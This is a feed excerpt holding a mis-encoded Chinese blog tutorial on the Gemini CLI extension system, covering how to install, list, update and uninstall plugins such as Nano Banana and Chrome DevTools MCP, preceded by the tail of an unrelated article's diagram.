<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   WebView   â”‚â”€â”€â”€â–¶â”‚NSURLProtocol â”‚â”€â”€â”€â–¶â”‚ SSR Handler â”‚
â”‚             â”‚    â”‚              â”‚    â”‚             â”‚
â”‚             â”‚â—€â”€â”€â”€â”‚              â”‚â—€â”€â”€â”€â”‚             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
       â–²                   â”‚
       â”‚                   â–¼
   å¢é‡æ¸²æŸ“          NSURLProtocolClient
       â–²                   â”‚
       â”‚                   â–¼
   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
   â”‚     didLoadData (chunk1)    â”‚
   â”‚     didLoadData (chunk2)    â”‚
   â”‚     didLoadData (chunkN)    â”‚
   â”‚  URLProtocolDidFinishLoading â”‚
   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gemini CLIä¸Šçº¿æ’ä»¶ç³»ç»Ÿ]]></title>    <link>https://juejin.cn/post/7575090551357259828</link>    <guid>https://juejin.cn/post/7575090551357259828</guid>    <pubDate>2025-11-23T02:41:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575090551357259828" data-draft-id="7575065455075868707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gemini CLIä¸Šçº¿æ’ä»¶ç³»ç»Ÿ"/> <meta itemprop="keywords" content="Gemini,AIGC"/> <meta itemprop="datePublished" content="2025-11-23T02:41:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°æºªå½¼å²¸"/> <meta itemprop="url" content="https://juejin.cn/user/976781670357400"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gemini CLIä¸Šçº¿æ’ä»¶ç³»ç»Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976781670357400/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°æºªå½¼å²¸
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T02:41:40.000Z" title="Sun Nov 23 2025 02:41:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å°ä¼™ä¼´ä»¬å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æºªï¼Œè§å­—å¦‚é¢ã€‚åœ¨ä¸ä¹…å‰Gemini CLIç»ˆäºä¸Šçº¿äº†æ’ä»¶ç³»ç»Ÿï¼Œç»ˆäºå¼€å§‹ç¼“æ…¢è¿½èµ¶Claude Code CLIçš„è„šæ­¥äº†ï¼Œè‡³æ­¤æˆ‘ä»¬ä¹Ÿç»ˆäºå¯ä»¥ä½¿ç”¨å¤§ä½¬ä»¬çš„æ’ä»¶ï¼Œå…±äº«æˆ‘ä»¬çš„æ’ä»¶äº†ã€‚</p>
<p>Gemini CLIæ›´æ–°æ—¥å¿—ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgoogle-gemini%2Fgemini-cli%2Fblob%2Fmain%2Fdocs%2Fchangelogs%2Findex.md" target="_blank" title="https://github.com/google-gemini/gemini-cli/blob/main/docs/changelogs/index.md" ref="nofollow noopener noreferrer">github.com/google-gemiâ€¦</a></p>
<p>å¯¹å¾€æœŸå†…å®¹æ„Ÿå…´è¶£çš„å°ä¼™ä¼´ä¹Ÿå¯ä»¥çœ‹å¾€æœŸå†…å®¹ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247492558%26idx%3D1%26sn%3De762047c93c4361f63744ec3c70a434f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247492558&amp;idx=1&amp;sn=e762047c93c4361f63744ec3c70a434f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Googleç™¾ä¸‡Tokenä¸Šä¸‹æ–‡Gemini CLIï¼Œç¦»AIè‡ªç”±æ›´è¿‘ä¸€æ­¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247493269%26idx%3D1%26sn%3D4775c90a4fab04126502bf79b0f75d70%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247493269&amp;idx=1&amp;sn=4775c90a4fab04126502bf79b0f75d70&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Claude Codeä¸Šçº¿æ’ä»¶ç³»ç»Ÿï¼ŒAIç¼–ç¨‹æ¨¡å¼å†æ¬¡å‡çº§</a></li>
</ul>
<h2 data-id="heading-1">å½“å‰ä½¿ç”¨ç‰ˆæœ¬</h2>
<p>Gemini CLIï¼š0.13.0</p>
<h2 data-id="heading-2">ä¼˜åŠ¿</h2>
<ul>
<li>æ’ä»¶ç³»ç»Ÿç›®å‰æ”¯æŒæ‰“åŒ… MCPã€ä¸Šä¸‹æ–‡æ–‡ä»¶ å’Œ è‡ªå®šä¹‰å‘½ä»¤ 3ç§é…ç½®</li>
</ul>
<h2 data-id="heading-3">Gemini CLI Extensionç®€ä»‹</h2>
<p>Gemini CLIå›´ç»•Extensionæ‰©å±•æ„å»ºäº†æ’ä»¶ç³»ç»Ÿï¼Œå®ƒå¯ä»¥å°† MCPæœåŠ¡ã€ä¸Šä¸‹æ–‡æ–‡ä»¶ ä»¥åŠ è‡ªå®šä¹‰å‘½ä»¤ æ‰“åŒ…æˆä¸€ä¸ªç®€å•è½¯ä»¶åŒ…ï¼Œå½“è½¯ä»¶åŒ…è¢«å®‰è£…åˆ° Gemini CLI ä¸­å°±å¯ä»¥è®© Gemini ä½¿ç”¨å„ç§å·¥å…·ã€‚Gemini CLI Extensionç›®å‰å·²æœ‰100å¤šæ¬¾æ’ä»¶ï¼ŒåŒ…å« Context7ã€Nano Bananaç­‰çˆ†ç«çš„æ’ä»¶ã€‚</p>
<p>Gemini CLI Extensionå®˜æ–¹åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgeminicli.com%2Fextensions%2F" target="_blank" title="https://geminicli.com/extensions/" ref="nofollow noopener noreferrer">geminicli.com/extensions/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d246f5ba07de4ac6ae1cb97fd12302ed~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=rurl4xfGTOtgfKS8rkUN8kMiTdM%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-4">åŸºæœ¬ä½¿ç”¨</h2>
<h3 data-id="heading-5">CLIå‘½ä»¤</h3>
<p>Gemini CLIå‘½ä»¤è¡Œå·¥æä¾›äº†ä¸€ç³»åˆ—extensionçš„ç®¡ç†å‘½ä»¤ï¼Œåœ¨å‘½ä»¤è¡Œç›´æ¥è¾“å…¥ gemini extensions -h å¯ä»¥æŸ¥çœ‹extensionsæ‰€æœ‰å‘½ä»¤</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8c8671fbd4474b21b5f510f1ff54cb16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=wjTFEFwu8IscF30U8Rtx1zAfjM8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>installï¼šä»Gitä»“åº“æˆ–è€…æœ¬åœ°è·¯å¾„å®‰è£…æ’ä»¶</li>
<li>uninstallï¼šå¸è½½æŒ‡å®šåç§°çš„æ’ä»¶</li>
<li>listï¼šæŸ¥çœ‹å½“å‰å®‰è£…çš„æ’ä»¶</li>
<li>updateï¼šæ›´æ–°æ‰€æœ‰æˆ–è€…æŒ‡å®šæ’ä»¶</li>
<li>disableï¼šç¦ç”¨æ’ä»¶</li>
<li>enableï¼šå¯ç”¨æ’ä»¶</li>
<li>linkï¼šä»æœ¬åœ°è·¯å¾„é“¾æ¥ä¸€ä¸ªæ’ä»¶</li>
<li>newï¼šä»æ¨¡æ¿åˆ›å»ºä¸€ä¸ªæ’ä»¶</li>
<li>validateï¼šä»æœ¬åœ°è·¯å¾„éªŒè¯ä¸€ä¸ªæ’ä»¶</li>
</ul>
<h3 data-id="heading-6">å®‰è£…æ’ä»¶</h3>
<p>åœ¨Gemini CLI Extensionå¹³å°æŸ¥æ‰¾è‡ªå·±éœ€è¦çš„æ’ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¥ Nano Banana ä¸ºä¾‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5f4ff65187c4d16b746f0d970e2eba4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=lPmT7v9IHEJoko%2FpCRouaJjH5gQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…ï¼Œå¤åˆ¶Extensionå®‰è£…å‘½ä»¤</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5972dbc44b16490e889588c1a869dabc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=MoDU%2FpbNxC6ZJRybpyM6Sm1FWoI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®Œæ•´å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$Â gemini</span> extensions install https:<span class="hljs-comment">//github.com/gemini-cli-extensions/nanobanana</span>
</code></pre>
<p>åœ¨å‘½ä»¤è¡Œç»ˆç«¯æ‰§è¡Œå®‰è£…å‘½ä»¤ï¼Œé‡åˆ°æƒé™é—®é¢˜ï¼Œæ ¹æ®æç¤ºé€‰æ‹©å…è®¸</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/905cd9c1e8b1459ba0f882b8dda1a16b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=GebYB7JGEyYVTzDRzt1qEi5e3L4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¯¦ç»†ä¿¡æ¯å¯ä»¥åœ¨ ~/.gemini/extensionsä¸­æŸ¥çœ‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87038fd5b39c4105ae172044022fdf64~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=o6rluLofC2vPr7Wfo4hzxNm5Pho%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯åŠ¨Gemini CLIï¼Œåœ¨äº¤äº’å¼å‘½ä»¤ä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ä»¥å·²å®‰è£…çš„æ’ä»¶</p>
<pre><code class="hljs language-bash" lang="bash">/extensions list
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cf27479daaa46f88018cffd5a9e2cb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=odWIO1OWHRiknlA0x50UUDBtia4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç„¶ååœ¨Gemini CLIä¸­å°±å¯ä»¥æŸ¥çœ‹ Nano Banana æä¾›çš„MCPå’Œè‡ªå®šä¹‰å‘½ä»¤äº†</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e7a14fb2341471fa7cf0b5b0b7c0b2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=LVI2fe2dA3dtTAHuL7tq3QJsMkk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb889d18a5934b1281f07d40670953fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=tabr69hUeKitMWbmXa7%2BUxy63ec%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>Nano BananaæŒ‡ä»¤ï¼š</p>
<ul>
<li>/generateï¼šå•å¼ æˆ–å¤šå¼ å¸¦æœ‰é£æ ¼ / å˜ä½“é€‰é¡¹çš„å›¾åƒç”Ÿæˆ</li>
<li>/editï¼šå›¾åƒç¼–è¾‘</li>
<li>/restoreï¼šå›¾åƒä¿®å¤</li>
<li>/iconï¼šç”Ÿæˆå¤šç§å°ºå¯¸çš„åº”ç”¨å›¾æ ‡ã€ç½‘ç«™å›¾æ ‡å’Œ UI å…ƒç´ </li>
<li>/patternï¼šç”Ÿæˆç”¨äºèƒŒæ™¯çš„æ— ç¼å›¾æ¡ˆå’Œçº¹ç†</li>
<li>/storyï¼šç”Ÿæˆè®²è¿°è§†è§‰æ•…äº‹æˆ–æµç¨‹çš„è¿ç»­å›¾åƒ</li>
<li>/diagramï¼šç”ŸæˆæŠ€æœ¯å›¾è¡¨ã€æµç¨‹å›¾å’Œå»ºç­‘æ¨¡å‹å›¾</li>
<li>/nanobananaï¼šä½¿ç”¨è‡ªç„¶è¯­è¨€ç”Ÿæˆæˆ–å¤„ç†å›¾ç‰‡</li>
</ul>
<h3 data-id="heading-7">æ’ä»¶ä½¿ç”¨</h3>
<p>ä»¥ Nano Banana ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡å‹æ¨ç†è‡ªè¡Œè°ƒç”¨</p>
<pre><code class="hljs language-bash" lang="bash">æˆ‘æ­£åœ¨åˆ›åŠä¸€å®¶åä¸º â€œKicksâ€ çš„é‹ä¸šå…¬å¸ï¼Œä½ èƒ½å¸®æˆ‘è®¾è®¡ä¸€ä¸ªè§†è§‰ä¸Šæœ‰å¸å¼•åŠ›çš„icon/logo
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/740117f8bf4b4cfa825b7aa7c122253c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=u36Q0WwdmXixT8KtjuhNHZ6WkSo%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ Nano Banana æä¾›çš„MCPå’Œè‡ªå®šä¹‰å‘½ä»¤è°ƒç”¨ï¼ŒNano Banana è°ƒç”¨ç›®å‰ä¸æŠ¥é”™ï¼Œå¯ä»¥ä¸ç”¨ç†ä¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d759aaf4066474eaea35aeb5d5ee567~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=BLzS%2BZoRniXFwbdt6PPgPi2P5mQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†ä»¥ Chrome Devtools MCPä¸ºä¾‹ï¼Œè¾“å…¥å‘½ä»¤è¿›è¡Œå®‰è£…</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">$</span><span class="bash">Â gemini extensions install https://github.com/ChromeDevTools/chrome-devtools-mcp</span>
</code></pre>
<p>å®‰è£…å®Œæˆåé‡å¯Gemini CLIï¼Œåœ¨äº¤äº’å¼å‘½ä»¤ä¸­è¾“å…¥ /mcpï¼Œå¯ä»¥çœ‹åˆ°åˆšåˆšé€šè¿‡æ’ä»¶å®‰è£…çš„ chrome-devtools MCPæœåŠ¡</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19c7dab6f8534a478ac64b4321ba76f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=RApYmPpN1KZyagMS%2Bng%2BZ2iijVg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¾“å…¥æç¤ºè¯å³å¯ä½¿ç”¨</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6687296803e74c54be20db4dacd23c75~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=21O9FZQnT2tUBzIye1onoa4Tssw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-8">ç®¡ç†æ’ä»¶</h3>
<p>Gemini CLIæä¾›äº† äº¤äº’å‘½ä»¤ å’Œ CLIå‘½ä»¤ 2ç§ç®¡ç†æ’ä»¶çš„æ–¹å¼</p>
<h4 data-id="heading-9">1ï¼‰äº¤äº’å‘½ä»¤</h4>
<p>åœ¨äº¤äº’å¼å‘½ä»¤ä¸­è¾“å…¥ /extensions å¯ä»¥æŸ¥çœ‹æ’ä»¶ç³»ç»Ÿæä¾›çš„ç®¡ç†å‘½ä»¤</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1af79fa5790b4d70bbf4b96f1a08d612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=iibIBKL6wV%2B%2BAt1oqlimly0R2lE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>listï¼šåˆ—å‡ºæ´»è·ƒçš„æ‰©å±•ç¨‹åº</li>
<li>updateï¼šæ›´æ–°æ‰©å±•ç¨‹åº</li>
<li>exploreï¼šåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æ‰©å±•ç¨‹åºé¡µé¢</li>
</ul>
<p>ä½¿ç”¨ /extensions list å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å®‰è£…çš„æ’ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91bbbc1c7b794764a530ffc9aeec6f54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=ljLzjDqT0jb1UZKBPXeLfZtFOTI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½¿ç”¨ /extensions update å¯ä»¥æ›´æ–°æ‰€æœ‰æ’ä»¶æˆ–è€…æ›´æ–°æŒ‡å®šæ’ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87b6b777b9e24ace8e971644cd41121a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=LfEyanJJyMW2gLLHRiHFAKPQ%2B8c%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½¿ç”¨ /extensions explore ä¼šæ‰“å¼€Gemini CLI Extensionså®˜ç½‘ã€‚</p>
<h3 data-id="heading-10">2ï¼‰CLIå‘½ä»¤</h3>
<p>ä½¿ç”¨ gemini extensions list å¯ä»¥æŸ¥çœ‹è¯¦ç»†çš„æ’ä»¶ä¿¡æ¯ï¼ŒåŒ…æ‹¬ æ’ä»¶è·¯å¾„ã€æ¥æºã€ç‰ˆæœ¬ã€å¯ç”¨ç¦ç”¨çŠ¶æ€ã€æä¾›çš„åŠŸèƒ½ ç­‰ä¿¡æ¯</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/514266ca58da45a6b947519aec07ead1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764470500&amp;x-signature=YBxeQ5xV0JT1egSkNPECy6X0eIE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½¿ç”¨ gemini extensions uninstall å¯å¸è½½æ’ä»¶</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$Â gemini</span> extensions uninstall nanobanana
</code></pre>
<p>ä½¿ç”¨ gemini extensions update å¯æ›´æ–°æ’ä»¶</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">#Â æ›´æ–°æŒ‡å®šæ’ä»¶</span>
<span class="hljs-variable">$Â gemini</span> extensions update nanobanana
<span class="hljs-comment">#Â æ›´æ–°æ‰€æœ‰æ’ä»¶</span>
<span class="hljs-variable">$Â gemini</span> extensions update --all
</code></pre>
<p>ä½¿ç”¨ gemini extensions enable|disable å¯å¯ç”¨ç¦ç”¨æ’ä»¶ï¼Œæœ¬äººå°è¯•çš„ä¸èµ·ä½œç”¨</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_">#</span><span class="bash">Â ç¦ç”¨æ’ä»¶</span>
